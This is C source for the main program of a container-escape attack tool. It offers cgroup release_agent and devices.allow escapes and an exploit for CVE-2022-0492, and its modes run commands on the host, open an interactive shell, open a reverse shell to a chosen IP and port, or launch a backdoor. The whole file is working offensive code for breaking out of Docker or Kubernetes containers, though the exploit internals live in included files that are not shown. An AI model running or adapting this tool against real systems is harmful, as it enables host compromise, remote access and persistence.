#define _GNU_SOURCE

#include "docker/capability.h"
#include "exploits/cve_2022_0492.h"
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include "util/output.h"
#include "util/program_info.h"
#include "docker/path.h"
#include "exploits/release_agent.h"
#include "util/regex_util.h"
#include "util/custom_struts.h"
#include "util/utils.h"
#include <getopt.h>
#include <stdio.h>
#include <unistd.h>

#include "docker/cgroup.h"
#include "exploits/devices_allow.h"

#define DEFAULT_INPUT_BUFFER_SIZE 1024

int cap_sys_admin_check() {
    int sys_admin = check_cap_sys_admin();
    if (sys_admin == 0) {
        printf_wrapper(INFO, "Try to use CVE-2022-0492 to get CAP_SYS_ADMIN\n");
        int result = cve_2022_0294();
        if (result == 0) {
            printf_wrapper(INFO, "No CAP_SYS_ADMIN capability, use CVE_2022_0492 failed\n");
            return -1;
        }
    }
    return 0;
}


int main(int argc, char *argv[]) {

    srand(time(NULL));

    if (argc == 1) {
        usage(argv[0]);
        exit(EXIT_SUCCESS);
    }

    static const struct option opts[] = {
            {"help",           no_argument,       NULL, 'h'},
            {"version",        no_argument,       NULL, 'v'},
            {"release-agent",  no_argument,       NULL, 'r'},
            {"devices-allow",  no_argument,       NULL, 'd'},
            {"cve-2022-0492",  no_argument,       NULL, 'u'},
            {"container_path", required_argument, NULL, 'p'},
            {"mode",           required_argument, NULL, 'm'},
            {"command",        required_argument, NULL, 'c'},
            {"ip",             required_argument, NULL, 'I'},
            {"port",           required_argument, NULL, 'P'},
            {"backdoor_path",  required_argument, NULL, 'B'}
    };
    int opt;
    attack_info.attack_mode = -1;
    attack_info.attack_type = -1;
    attack_info.command = (char *) malloc(512 * sizeof(char));
    attack_info.ip = (char *) malloc(64 * sizeof(char));
    attack_info.backdoor_path = (char *) malloc(512 * sizeof(char));
    attack_info.port = (char *) malloc(10 * sizeof(char));
    memset(attack_info.command, 0x00, 512);
    memset(attack_info.ip, 0x00, 64);
    memset(attack_info.ip, 0x00, 512);
    memset(attack_info.port, 0x00, 10);
    const char *opt_type = "hvrdup:m:c:I:P:B:";
    while ((opt = getopt_long_only(argc, argv, opt_type, opts, NULL)) != -1) {
        switch (opt) {
            case 'h':
                usage(argv[0]);
                break;
            case 'v':
                print_version();
                break;
            case 'r':
                attack_info.attack_type = RELEASE_AGENT;
                break;
            case 'd':
                attack_info.attack_type = DEVICE_ALLOW;
                break;
            case 'c':
                attack_info.command = optarg;
                break;
            case 'm':
                if (strcmp(optarg, "exec") == 0) {
                    attack_info.attack_mode = EXEC;
                } else if (strcmp(optarg, "shell") == 0) {
                    attack_info.attack_mode = SHELL;
                } else if (strcmp(optarg, "reverse") == 0) {
                    attack_info.attack_mode = REVERSE;
                } else if (strcmp(optarg, "backdoor") == 0) {
                    attack_info.attack_mode = BACKDOOR;
                } else {
                    printf_wrapper(ERROR, "Unknown attack mode -m support {exec | shell | reverse}\n");
                    exit(EXIT_SUCCESS);
                }
                break;
            case 'I':
                attack_info.ip = optarg;
                break;
            case 'P':
                attack_info.port = optarg;
                break;
            case 'B':
                attack_info.backdoor_path = optarg;
                break;
            case 'u':
                attack_info.attack_type = CVE_2022_0492;
                attack_info.attack_mode = SHELL;
                break;
            default:
                usage(argv[0]);
                break;
        }
    }
    if (attack_info.attack_type == RELEASE_AGENT) {
        if (attack_info.attack_mode == EXEC) {
            output_bash_warning("release_agent", "exec");
        } else if (attack_info.attack_mode == SHELL) {
            output_bash_warning("release_agent", "shell");
        } else if (attack_info.attack_mode == REVERSE) {
            output_bash_warning("release_agent", "reverse");
        }
    } else if (attack_info.attack_type == DEVICE_ALLOW) {
        if (attack_info.attack_mode == REVERSE) {
            output_bash_warning("device_allow", "reverse");
        }
    }
    if (attack_info.attack_type == -1 || attack_info.attack_mode == -1) {
        printf_wrapper(ERROR, "Args set error, args of escape and -m must set\n");
        exit(EXIT_SUCCESS);
    }
    if (attack_info.attack_mode == EXEC && attack_info.command[0] == 0x00) {
        printf_wrapper(ERROR, "In exec mode, -c must be set and can't be empty\n");
        exit(EXIT_SUCCESS);
    }
    if (attack_info.attack_mode == REVERSE && (attack_info.ip[0] == 0x00 || strcmp(attack_info.port, "") == 0)) {
        printf_wrapper(ERROR, "In reverse mode, -I and -P must set\n");
        exit(EXIT_SUCCESS);
    }

    if (attack_info.attack_mode == BACKDOOR && attack_info.backdoor_path == 0x00) {
        printf_wrapper(ERROR, "In backdoor mode, -B  must set\n");
        exit(EXIT_SUCCESS);
    }

    printf_wrapper(INFO, "Check if the program is running in docker\n");
    char *cgroup_id = malloc(512 * sizeof(char));
    memset(cgroup_id, 0x00, 512);
    get_cgroup_id(cgroup_id);
    if (!*cgroup_id) {
        printf_wrapper(ERROR, "The current running environment does not appear to be a docker or k8s\n");
        exit(EXIT_SUCCESS);
    }

    switch (attack_info.attack_type) {
        case RELEASE_AGENT: {
            if (cap_sys_admin_check() == -1) {
                printf_wrapper(ERROR,
                               "Current process don't have CAP_SYS_ADMIN capability，can't escape by using release_agent\n");
            }
            printf_wrapper(INFO, "Try to get container path in host\n");
            char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
            memset(container_path_in_host, 0x00, 1024);
            get_container_path_in_host(container_path_in_host);
            if (*container_path_in_host == 0x00) {
                printf_wrapper(ERROR, "Get container path in host failed\n");
                exit(EXIT_SUCCESS);
            }
            release_agent_attack_info.container_path_in_host = container_path_in_host;
            if (escape_by_release_agent() != 0) {
                printf_wrapper(ERROR, "Escape by release_agent failed\n");
                exit(EXIT_SUCCESS);
            }

            if (attack_info.attack_mode == EXEC) {
                if (release_agent_exec() == -1) {
                    printf_wrapper(ERROR, "Execute the command %s failed\n", attack_info.command);
                }
            }

            if (attack_info.attack_mode == SHELL) {
                printf_wrapper(INFO,
                               "About to enter shell, please enter 'quit' to exit shell, other way out, such as using 'ctrl+c' will not clean up the attack\n");

                char *inputBuffer = malloc(sizeof(char) * DEFAULT_INPUT_BUFFER_SIZE);
                memset(inputBuffer, 0x00, DEFAULT_INPUT_BUFFER_SIZE);
                while (strcmp(inputBuffer, "quit") != 0) {
                    printf("# ");
                    fgets(inputBuffer, DEFAULT_INPUT_BUFFER_SIZE, stdin);
                    if (inputBuffer[strlen(inputBuffer) - 1] != '\n') {
                        printf_wrapper(ERROR, "The input was too long, input buffer size %s",
                                       DEFAULT_INPUT_BUFFER_SIZE);
                    }
                    inputBuffer[strcspn(inputBuffer, "\n")] = 0x00;
                    strcpy(attack_info.command, inputBuffer);
                    if (release_agent_exec() == -1) {
                        printf_wrapper(ERROR, "Execute the command %s failed\n", attack_info.command);
                    }
                }
                free(inputBuffer);
            }

            if (attack_info.attack_mode == REVERSE) {
                if (release_agent_reverse() == -1) {
                    printf_wrapper(ERROR, "Reverse shell failed\n");
                }
            }

            if (attack_info.attack_mode == BACKDOOR) {
                if (release_agent_backdoor() == -1) {
                    printf_wrapper(ERROR, "Run backdoor %s failed\n", attack_info.backdoor_path);
                }
            }
            free(container_path_in_host);
            break;
        }
        case DEVICE_ALLOW: {
            if (attack_info.attack_mode == EXEC) {
                printf_wrapper(ERROR, "Escape by device_allow not support exec mode\n");
                exit(EXIT_SUCCESS);
            } else if (attack_info.attack_mode == SHELL) {
                if (check_cap_sys_admin() == -1) {
                    printf_wrapper(ERROR,
                                   "Current process don't have CAP_SYS_ADMIN capability，can't escape by using device_allow\n");
                    return -1;
                }
                device_allow_attack_info.cgroup_id = malloc(512 * sizeof(char));
                strcpy(device_allow_attack_info.cgroup_id, cgroup_id);
                if (escape_by_device_allow() != -1) {
                    device_allow_shell();
                } else {
                    printf_wrapper(ERROR, "Escape by device_allow failed\n");
                }
            } else if (attack_info.attack_mode == REVERSE) {
                if (check_cap_sys_admin() == -1) {
                    printf_wrapper(ERROR,
                                   "Current process don't have CAP_SYS_ADMIN capability，can't escape by using device_allow\n");
                }
                device_allow_attack_info.cgroup_id = malloc(512 * sizeof(char));
                strcpy(device_allow_attack_info.cgroup_id, cgroup_id);
                if (escape_by_device_allow() != -1) {
                    device_allow_reverse();
                } else {
                    printf_wrapper(ERROR, "Escape by device_allow failed\n");
                }
            }
            break;
        }
        case CVE_2022_0492: {
            int sys_admin = check_cap_sys_admin();
            if (sys_admin == 0) {
                printf_wrapper(INFO, "Try to attack by CVE-2022-0492 to get CAP_SYS_ADMIN\n");
                int result = cve_2022_0294();
                if (result == 0) {
                    printf_wrapper(INFO, "Attack by CVE_2022_0492 failed\n");
                } else {
                    printf_wrapper(INFO, "Attack by CVE_2022_0492 success\n");
                    char *bash_args[] = {
                            "/bin/bash",
                            NULL
                    };
                    int ret = execvp(bash_args[0], bash_args);
                    if (ret == -1) {
                        exit(EXIT_SUCCESS);
                    } else {
                        printf_wrapper(INFO, "New process id: %d", ret);
                    }
                }
            } else {
                printf_wrapper(INFO,
                               "Current process already has CAP_SYS_ADMIN capability, no need to use CVE_2022_0492\n");
            }
            break;
        }
    }
}
